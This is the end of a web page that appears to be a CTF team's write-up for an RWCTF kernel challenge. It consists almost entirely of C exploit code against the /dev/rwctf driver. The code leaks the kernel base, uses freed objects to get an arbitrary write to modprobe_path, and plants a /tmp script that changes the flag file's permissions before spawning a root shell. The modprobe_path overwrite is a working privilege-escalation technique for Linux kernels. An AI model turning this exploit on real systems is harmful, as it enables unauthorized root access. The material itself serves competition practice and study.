+</span></span><span class=line><span class=cl>	<span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>buf</span><span class=p>[</span><span class=mh>0x2</span><span class=p>]</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=mh>0x18510a0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>((</span><span class=n>char</span> <span class=o>*</span><span class=p>)</span><span class=n>buf</span><span class=p>,</span> <span class=s2>&#34;/tmp/a&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=s2>&#34;echo -ne &#39;</span><span class=se>\\</span><span class=s2>xff</span><span class=se>\\</span><span class=s2>xff</span><span class=se>\\</span><span class=s2>xff</span><span class=se>\\</span><span class=s2>xff&#39; &gt; /tmp/dummy&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=s2>&#34;echo &#39;#!/bin/sh</span><span class=se>\n</span><span class=s2>chmod 777 /flag&#39; &gt; /tmp/a&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=s2>&#34;chmod +x /tmp/a&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=s2>&#34;chmod +x /tmp/dummy&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>dev_fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/dev/rwctf&#34;</span><span class=p>,</span><span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>dev_fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=n>err</span><span class=p>(</span><span class=s2>&#34;[X] Device Open Error&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		
+</span></span><span class=line><span class=cl>	<span class=n>leak_kernel_base</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>modprobe_path</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=mh>0x18510a0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s2>&#34;[+] kernel_base = 0x</span><span class=si>%lx</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>kernel_base</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s2>&#34;[+] modprobe_path = 0x</span><span class=si>%lx</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>modprobe_path</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>arbitrary_write</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=s2>&#34;/tmp/dummy&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/rwctf/>RWCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/rwctf-2022-su-wu/>2022 RWCTF体验赛 SU Writeup</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/ntfy-2022-su-wu/ data-toggle=tooltip data-placement=top title="第五届“强网”拟态防御国际精英挑战赛 SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/xctffinals-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 XCTFfinals SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
+&nbsp;&bull;&nbsp;&copy;
+2026
+&nbsp;&bull;&nbsp;
+<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>
